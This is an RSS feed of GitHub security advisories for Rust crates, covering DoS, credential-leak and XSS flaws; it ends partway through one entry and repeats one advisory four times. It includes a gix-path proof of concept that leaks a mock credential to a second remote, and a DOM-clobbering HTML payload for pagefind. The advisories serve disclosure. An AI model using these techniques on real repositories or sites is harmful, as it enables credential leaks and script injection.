<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2024-09-05T03:01:18.835Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[aardvark-dns] Missing connection timeout in Aardvark-dns]]></title>
        <id>https://github.com/advisories/GHSA-g5jh-57wm-p79m</id>
        <link href="https://github.com/advisories/GHSA-g5jh-57wm-p79m"/>
        <updated>2024-09-04T17:22:37.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Aardvark-dns versions 1.12.0 and 1.12.1. They contain a denial of service vulnerability due to serial processing of TCP DNS queries. This flaw allows a malicious client to keep a TCP connection open indefinitely, causing other DNS queries to time out and resulting in a denial of service for all other containers using aardvark-dns.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8418">https://nvd.nist.gov/vuln/detail/CVE-2024-8418</a></li>
<li><a href="https://github.com/containers/aardvark-dns/issues/500">https://github.com/containers/aardvark-dns/issues/500</a></li>
<li><a href="https://github.com/containers/aardvark-dns/pull/503">https://github.com/containers/aardvark-dns/pull/503</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-8418">https://access.redhat.com/security/cve/CVE-2024-8418</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2309683">https://bugzilla.redhat.com/show_bug.cgi?id=2309683</a></li>
<li><a href="https://github.com/containers/aardvark-dns/commit/aa109bbd6743abd7027e589cc4b871dd2dce7d50">https://github.com/containers/aardvark-dns/commit/aa109bbd6743abd7027e589cc4b871dd2dce7d50</a></li>
<li><a href="https://github.com/advisories/GHSA-g5jh-57wm-p79m">https://github.com/advisories/GHSA-g5jh-57wm-p79m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5jh-57wm-p79m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-04T15:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[olm-sys] olm-sys: wrapped library unmaintained, potentially vulnerable]]></title>
        <id>https://github.com/advisories/GHSA-p2q9-36vw-c468</id>
        <link href="https://github.com/advisories/GHSA-p2q9-36vw-c468"/>
        <updated>2024-09-03T21:11:22.000Z</updated>
        <content type="html"><![CDATA[<p>After several cryptographic vulnerabilities in <code>libolm</code> were disclosed publicly, the Matrix Foundation has <a href="https://matrix.org/blog/2024/08/libolm-deprecation/">officially deprecated the library</a>. <code>olm-sys</code> is a thin wrapper around <code>libolm</code> and is now deprecated and potentially vulnerable in kind.</p>
<p>Users of <code>olm-sys</code> and its higher-level abstraction, <code>olm-rs</code>, are highly encouraged to switch to <a href="https://crates.io/crates/vodozemac"><code>vodozemac</code></a> as soon as possible. It is the successor effort to <code>libolm</code> and is written in Rust.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://gitlab.gnome.org/BrainBlasted/olm-sys/-/issues/12">https://gitlab.gnome.org/BrainBlasted/olm-sys/-/issues/12</a></li>
<li><a href="https://matrix.org/blog/2024/08/libolm-deprecation">https://matrix.org/blog/2024/08/libolm-deprecation</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0368.html">https://rustsec.org/advisories/RUSTSEC-2024-0368.html</a></li>
<li><a href="https://github.com/advisories/GHSA-p2q9-36vw-c468">https://github.com/advisories/GHSA-p2q9-36vw-c468</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2q9-36vw-c468</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T21:11:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quinn-proto] Denial of service in quinn-proto when using `Endpoint::retry()`]]></title>
        <id>https://github.com/advisories/GHSA-vr26-jcq5-fjj8</id>
        <link href="https://github.com/advisories/GHSA-vr26-jcq5-fjj8"/>
        <updated>2024-09-03T20:49:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>As of quinn-proto 0.11, it is possible for a server to <code>accept()</code>, <code>retry()</code>, <code>refuse()</code>, or <code>ignore()</code> an <code>Incoming</code> connection. However, calling <code>retry()</code> on an unvalidated connection exposes the server to a likely panic in the following situations:</p>
<ul>
<li>Calling <code>refuse</code> or <code>ignore</code> on the resulting validated connection, if a duplicate initial packet is received<ul>
<li>This issue can go undetected until a server's <code>refuse()</code>/<code>ignore()</code> code path is exercised, such as to stop a denial of service attack.</li>
</ul>
</li>
<li>Accepting when the initial packet for the resulting validated connection fails to decrypt or exhausts connection IDs, if a similar initial packet that successfully decrypts and doesn't exhaust connection IDs is received.<ul>
<li>This issue can go undetected if clients are well-behaved.</li>
</ul>
</li>
</ul>
<p>The former situation was observed in a real application, while the latter is only theoretical.</p>
<h3 id="details">Details</h3>
<p>Location of panic: <a href="https://github.com/quinn-rs/quinn/blob/bb02a12a8435a7732a1d762783eeacbb7e50418e/quinn-proto/src/endpoint.rs#L213">https://github.com/quinn-rs/quinn/blob/bb02a12a8435a7732a1d762783eeacbb7e50418e/quinn-proto/src/endpoint.rs#L213</a></p>
<h3 id="impact">Impact</h3>
<p>Denial of service for internet-facing server</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/quinn-rs/quinn/security/advisories/GHSA-vr26-jcq5-fjj8">https://github.com/quinn-rs/quinn/security/advisories/GHSA-vr26-jcq5-fjj8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45311">https://nvd.nist.gov/vuln/detail/CVE-2024-45311</a></li>
<li><a href="https://github.com/quinn-rs/quinn/commit/e01609ccd8738bd438d86fa7185a0f85598cb58f">https://github.com/quinn-rs/quinn/commit/e01609ccd8738bd438d86fa7185a0f85598cb58f</a></li>
<li><a href="https://github.com/quinn-rs/quinn/blob/bb02a12a8435a7732a1d762783eeacbb7e50418e/quinn-proto/src/endpoint.rs#L213">https://github.com/quinn-rs/quinn/blob/bb02a12a8435a7732a1d762783eeacbb7e50418e/quinn-proto/src/endpoint.rs#L213</a></li>
<li><a href="https://github.com/advisories/GHSA-vr26-jcq5-fjj8">https://github.com/advisories/GHSA-vr26-jcq5-fjj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vr26-jcq5-fjj8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T20:49:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-path] gix-path uses local config across repos when it is the highest scope]]></title>
        <id>https://github.com/advisories/GHSA-v26r-4c9c-h3j6</id>
        <link href="https://github.com/advisories/GHSA-v26r-4c9c-h3j6"/>
        <updated>2024-09-03T20:21:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>gix-path</code> executes <code>git</code> to find the path of a configuration file that belongs to the <code>git</code> installation itself, but mistakenly treats the local repository's configuration as system-wide if no higher scoped configuration is found. In rare cases, this causes a less trusted repository to be treated as more trusted, or leaks sensitive information from one repository to another, such as sending credentials to another repository's remote.</p>
<h3 id="details">Details</h3>
<p>In <code>gix_path::env</code>, the underlying implementation of the <code>installation_config</code> and <code>installation_config_prefix</code> functions calls <code>git config -l --show-origin</code> and parses the first line of the output to extract the path to the configuration file holding the configuration variable of highest <a href="https://git-scm.com/docs/git-config#SCOPES">scope</a>:</p>
<p><a href="https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L91">https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L91</a></p>
<p><a href="https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L112">https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L112</a></p>
<p>While the configuration variable of highest scope is not usually in the local scope, there are practical situations where this occurs:</p>
<ul>
<li>A configuration file truly associated with the installation is not present on all systems and can occasionally be empty. Likewise, there may be no variables in the global scope.</li>
<li>Configuration files associated with those higher scopes may be deliberately skipped by setting the <code>GIT_CONFIG_SYSTEM</code> and <code>GIT_CONFIG_GLOBAL</code> environment variables to <code>/dev/null</code> (or to <code>NUL</code> on Windows). This prevents <code>gix-path</code> from finding the path of configuration files for those scopes, while not preventing downstream components such as the function in <code>gix-config</code> from reporting a local path as being associated with the installation.</li>
<li>The <code>GIT_CONFIG_NOSYSTEM</code> environment variable can be used to disable configuration associated with the installation. (<code>GIT_CONFIG_NOSYSTEM=1</code> is more powerful than <code>GIT_CONFIG_SYSTEM=/dev/null</code> on systems where an additional "unknown" scope is associated with the installation, as occurs on macOS with Apple Git.) This will cause the local scope to be the highest nonempty scope under even more situations, though in practice it is less dangerous because most, though possibly not all, downstream components would disregard the value.</li>
</ul>
<p>A user may use either or both of the latter two techniques to turn off an undesired configuration or to create a more replicable environment. Such a user would expect that this results in a more controlled configuration.</p>
<p>Often, when located inside one repository, a user performs operations on that repository or that are not specific to any repository. In such use, local configuration is typically desired or at least acceptable, and mistaking it as coming from another scope is not typically harmful.</p>
<p>However, sometimes a user is in one repository and operates on another repository. A major case where this occurs is cloning one repository while located in another. This can be done in an ad-hoc fashion, including when cloning the repository outside of the one we are inside. It may also potentially be automated by an application for purposes such as submodule handling. Two kinds of problems are anticipated:</p>
<ul>
<li>A less secure configuration may be set for a specific repository where it is judged acceptable, even though it would not be wanted for other repositories, such as to enable a protocol or set up debugging.</li>
<li>More likely, a configuration that supplies secrets for use in one repository's remote can be used to send those secrets to another repository's remote.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>In this example, we send mock <code>Authorization: Basic ...</code> credentials meant for one repository's remote to another remote, by running <code>gix</code> while inside the first repository to clone the second repository.</p>
<p>These instructions are written for a Unix shell, but they will work in other shells, including in PowerShell on Windows if the method of setting environment variables is adapted and <code>/dev/null</code> is replaced with <code>NUL</code>. This procedure is likely to demonstrate the problem on all systems <em>except</em> macOS. This is due to the high-scoped "unknown" configuration that usually accompanies Apple Git, and reflects that gix-path is in practice much less vulnerable on macOS (though still potentially vulnerable).</p>
<ol>
<li><p>Install <a href="https://crates.io/crates/dummyhttp"><code>dummyhttp</code></a> to serve as a local HTTP server for the demonstration.</p>
</li>
<li><p>Obtain a build of <code>gitoxide</code> with the <code>max</code> feature set enabled. While this vulnerability affects other builds, this example requires <code>max</code> for <code>http.extraHeader</code> support.</p>
<p>Running <code>cargo install gitoxide</code> will install such a build though it may build against a patched version of <code>gix-path</code>. Cloning the repository (12251eb052df30105538fa831e641eea557f13d8 and earlier are affected) and building with <code>cargo build</code> or <code>cargo install --path .</code> are also sufficient. In contrast, installing from published binaries with <code>binstall</code> or <code>quickinstall</code> does not provide the <code>max</code> feature, as of this writing.</p>
</li>
<li><p>Run: <code>dummyhttp -i 127.0.0.1 -c 403 -v</code></p>
</li>
<li><p>In a separate terminal, create a new local repository and set up a mock remote and <code>http.extraHeader</code> configuration:</p>
<pre><code class="language-sh">git init myrepo
cd myrepo
git remote add origin http://127.0.0.1:8080/mygit.git
git config --local http.extraHeader 'Authorization: Basic abcde'
</code></pre>
</li>
<li><p>Make sure the testing setup is working by running <code>gix fetch</code> in the repository and checking that it fails in the expected way. In the terminal where that is run, a message should be shown indicating an HTTP 403 error. The more interesting output is in the terminal where <code>dummyhttp</code> is running, which should look like this:</p>
<pre><code class="language-text">2024-30-30 03:30:16 127.0.0.1:55689 GET /myrepo.git/info/refs?service=git-upload-pack HTTP/1.1
┌─Incoming request
│ GET /myrepo.git/info/refs?service=git-upload-pack HTTP/1.1
│ Accept: */*
│ Authorization: Basic abcde
│ Git-Protocol: version=2
│ Host: 127.0.0.1:8080
│ User-Agent: git/oxide-0.42.2
┌─Outgoing response
│ HTTP/1.1 403 Forbidden
│ Content-Length: 9
│ Content-Type: text/plain; charset=utf-8
│ Date: Fri, 30 Aug 2024 03:30:16 -0400
</code></pre>
<p>Some details may differ, especially dates and times. But <code>Authorization: Basic abcde</code> should be shown.</p>
</li>
<li><p>Now, in the terminal where you ran <code>gix fetch</code>, try cloning a separate repository:</p>
<pre><code class="language-sh">gix clone http://127.0.0.1:8080/other.git
</code></pre>
<p>Check the output appended in the terminal where <code>dummyhttp</code> is running. This is to observe that <code>Authorization: Basic abcde</code> was rightly <em>not</em> sent.</p>
<p>Alternatively, if it <em>does</em> appear, then your system may be in one of the uncommon configurations that is vulnerable without further action.</p>
</li>
<li><p>Now rerun that command, but with a modified environment, to cause <code>gix-path</code> to wrongly treat configuration from the local scope as being associated with the <code>git</code> installation:</p>
<pre><code class="language-sh">env GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_GLOBAL=/dev/null gix clone http://127.0.0.1:8080/other.git
</code></pre>
<p>Check the output appended in the terminal where <code>dummyhttp</code> is running. Observe that <code>Authorization: Basic abcde</code> was wrongly sent.</p>
</li>
</ol>
<p>While this procedure uses the same remote host for both repositories, this is not a required element. If the second repository had a different, untrusted host, the extra header would still be sent.</p>
<h3 id="impact">Impact</h3>
<p>It is believed to be very difficult to exploit this vulnerability deliberately, due to the need either to anticipate a situation in which higher-scoped configuration variables would be absent, or to arrange for this to happen. Although any operating system may be affected, users running Apple Git on macOS are much less likely to be affected.</p>
<p>In the example shown above, more secure general practices would avoid it: using a credential manager, or even using <code>http.&lt;url&gt;.extraHeader</code> with as specific a <code>&lt;url&gt;</code> as possible, rather than the more general <code>http.extraHeader</code>. Many scenarios are analogous: if each repository's configuration is as secure as possible for how the repository is used, and secrets are stored securely and separately, then the circumstances under which an unacceptably unsecure configuration is used, or under which a leak of credentials would occur, become unlikely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-v26r-4c9c-h3j6">https://github.com/Byron/gitoxide/security/advisories/GHSA-v26r-4c9c-h3j6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45305">https://nvd.nist.gov/vuln/detail/CVE-2024-45305</a></li>
<li><a href="https://git-scm.com/docs/git-config#SCOPES">https://git-scm.com/docs/git-config#SCOPES</a></li>
<li><a href="https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L112">https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L112</a></li>
<li><a href="https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L91">https://github.com/Byron/gitoxide/blob/12251eb052df30105538fa831e641eea557f13d8/gix-path/src/env/git/mod.rs#L91</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0367.html">https://rustsec.org/advisories/RUSTSEC-2024-0367.html</a></li>
<li><a href="https://github.com/advisories/GHSA-v26r-4c9c-h3j6">https://github.com/advisories/GHSA-v26r-4c9c-h3j6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v26r-4c9c-h3j6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-03T20:21:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pagefind] DOM clobbering could escalate to Cross-site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</id>
        <link href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx"/>
        <updated>2024-09-03T21:45:33.000Z</updated>
        <content type="html"><![CDATA[<p>Pagefind initializes its dynamic JavaScript and WebAssembly files relative to the location of the first script you load. This information is gathered by looking up the value of <code>document.currentScript.src</code>.</p>
<p>It is possible to "clobber" this lookup with otherwise benign HTML on the page, for example:</p>
<pre><code class="language-html">&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;
</code></pre>
<p>This will cause <code>document.currentScript.src</code> to resolve as an external domain, which will then be used by Pagefind to load dependencies.</p>
<p>This exploit would only work in the case that an attacker could inject HTML to your live, hosted, website. In these cases, this would act as a way to escalate the privilege available to an attacker. This assumes they have the ability to add some elements to the page (for example, <code>img</code> tags with a <code>name</code> attribute), but not others, as adding a <code>script</code> to the page would itself be the XSS vector.</p>
<p>Pagefind has tightened this resolution by ensuring the source is loaded from a valid script element. There are no reports of this being exploited in the wild via Pagefind.</p>
<h3 id="original-report">Original Report</h3>
<p>If an attacker can inject benign html, such as:
<code>&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;</code></p>
<p>they can clobber <code>document.currentScript.src</code> leading to XSS in your library.</p>
<p>Here is the same attack on webpack that was accepted: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb">https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45389">https://nvd.nist.gov/vuln/detail/CVE-2024-45389</a></li>
<li><a href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/advisories/GHSA-gprj-6m2f-j9hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T19:33:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cargo] Cargo prior to Rust 1.26.0 may download the wrong dependency]]></title>
        <id>https://github.com/advisories/GHSA-9f3p-wvj7-q82x</id>
        <link href="https://github.com/advisories/GHSA-9f3p-wvj7-q82x"/>
        <updated>2024-08-29T18:03:17.000Z</updated>
        <content type="html"><![CDATA[<p>Cargo prior to Rust 1.26.0 may download the wrong dependency if your package.toml file uses the <code>package</code> configuration key. Usage of the <code>package</code> key to rename dependencies in <code>Cargo.toml</code> is ignored in Rust 1.25.0 and prior. When Rust 1.25.0 and prior is used Cargo may download the wrong dependency, which could be squatted on crates.io to be a malicious package. This not only affects manifests that you write locally yourself, but also manifests published to crates.io. Rust 1.0.0 through Rust 1.25.0 is affected by this advisory because Cargo will ignore the <code>package</code> key in manifests. Rust 1.26.0 through Rust 1.30.0 are not affected and typically will emit an error because the <code>package</code> key is unstable. Rust 1.31.0 and after are not affected because Cargo understands the <code>package</code> key. Users of the affected versions are strongly encouraged to update their compiler to the latest available one. Preventing this issue from happening requires updating your compiler to be either Rust 1.26.0 or newer. There will be no point release for Rust versions prior to 1.26.0. Users of Rust 1.19.0 to Rust 1.25.0 can instead apply linked patches to mitigate the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-lang/rust/security/advisories/GHSA-phjm-8x66-qw4r">https://github.com/rust-lang/rust/security/advisories/GHSA-phjm-8x66-qw4r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16760">https://nvd.nist.gov/vuln/detail/CVE-2019-16760</a></li>
<li><a href="https://gist.github.com/pietroalbini/0d293b24a44babbeb6187e06eebd4992">https://gist.github.com/pietroalbini/0d293b24a44babbeb6187e06eebd4992</a></li>
<li><a href="https://groups.google.com/forum/#!topic/rustlang-security-announcements/rVQ5e3TDnpQ">https://groups.google.com/forum/#!topic/rustlang-security-announcements/rVQ5e3TDnpQ</a></li>
<li><a href="https://groups.google.com/forum/#%21topic/rustlang-security-announcements/rVQ5e3TDnpQ">https://groups.google.com/forum/#%21topic/rustlang-security-announcements/rVQ5e3TDnpQ</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2019/10/08/3">http://www.openwall.com/lists/oss-security/2019/10/08/3</a></li>
<li><a href="https://github.com/advisories/GHSA-9f3p-wvj7-q82x">https://github.com/advisories/GHSA-9f3p-wvj7-q82x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9f3p-wvj7-q82x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T16:57:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] CWA-2023-004: Excessive number of function parameters in compiled Wasm]]></title>
        <id>https://github.com/advisories/GHSA-75qh-gg76-p2w4</id>
        <link href="https://github.com/advisories/GHSA-75qh-gg76-p2w4"/>
        <updated>2024-08-27T19:55:41.000Z</updated>
        <content type="html"><![CDATA[<p>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract.
This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM,
preventing any further interaction with contracts.</p>
<p>For more information, see <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">CWA-2023-004</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840">https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0366.html">https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li>
<li><a href="https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023">https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li>
<li><a href="https://github.com/advisories/GHSA-75qh-gg76-p2w4">https://github.com/advisories/GHSA-75qh-gg76-p2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75qh-gg76-p2w4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-27T19:55:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apollo-router] Apollo Router Coprocessors may cause Denial-of-Service when handling request bodies]]></title>
        <id>https://github.com/advisories/GHSA-x6xq-whh3-gg32</id>
        <link href="https://github.com/advisories/GHSA-x6xq-whh3-gg32"/>
        <updated>2024-08-27T20:31:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Instances of the Apollo Router using either of the following may be impacted by a denial-of-service vulnerability.</p>
<ol>
<li>External Coprocessing with specific configurations; or</li>
<li>Native Rust Plugins accessing the Router request body in the RouterService layer</li>
</ol>
<p>Router customizations using Rhai scripts are <strong>not</strong> impacted.</p>
